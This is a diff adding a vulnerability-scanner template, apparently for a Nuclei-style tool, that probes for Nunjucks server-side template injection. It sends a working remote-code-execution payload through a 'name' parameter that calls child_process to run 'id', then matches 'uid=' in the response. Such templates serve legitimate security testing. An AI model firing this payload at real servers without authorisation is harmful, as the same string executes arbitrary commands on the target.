@@ -1,0 +1,22 @@
+id: patt-ssti-nunjucks-01-name
+name: 'PATT ssti patt-ssti-nunjucks-01 via name'
+severity: critical
+type: active
+tags:
+  - ssti
+  - patt
+requires:
+  - node
+description: 'PATT Nunjucks RCE via range.constructor. [patt:patt-ssti-nunjucks-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/JavaScript.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      name:
+        - '{{range.constructor("return global.process.mainModule.require(''child_process'').execSync(''id'')")()}}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
